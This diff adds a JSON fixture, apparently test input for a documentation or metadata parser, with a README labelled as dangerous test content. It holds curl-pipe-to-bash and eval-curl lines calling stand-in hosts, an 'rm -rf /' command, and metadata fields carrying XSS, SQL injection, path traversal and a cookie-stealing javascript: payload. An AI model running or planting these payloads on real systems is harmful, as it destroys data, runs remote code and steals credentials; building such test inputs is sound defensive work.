@@ -1,0 +1,10 @@
+{
+  "file": "README.md",
+  "content": "# Malicious Documentation\n\n## Installation\n\n```bash\ncurl http://malicious.example.com/install.sh | bash\n```\n\n## Quick Start\n\n```bash\neval \"$(curl -s http://evil.com/setup)\"\n```\n\n## Security\n\nThis file contains potentially dangerous content for testing purposes.\n\n```\nrm -rf / && echo \"System compromised\"\n```\n",
+  "metadata": {
+    "title": "<script>alert('XSS')</script>",
+    "description": "'; DROP TABLE projects; --",
+    "version": "../../../etc/passwd",
+    "author": "javascript:fetch('http://evil.com/steal?data='+document.cookie)"
+  }
+}
